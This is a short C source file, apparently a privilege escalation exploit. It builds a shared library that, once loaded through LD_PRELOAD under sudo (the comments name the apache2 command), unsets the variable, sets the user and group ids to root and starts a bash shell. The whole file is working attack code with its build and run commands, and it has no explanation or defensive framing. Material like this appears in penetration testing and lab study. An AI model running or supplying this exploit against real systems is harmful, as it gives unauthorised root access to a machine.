//gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
//sudo LD_PRELOAD=/tmp/x.so apache2
//
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

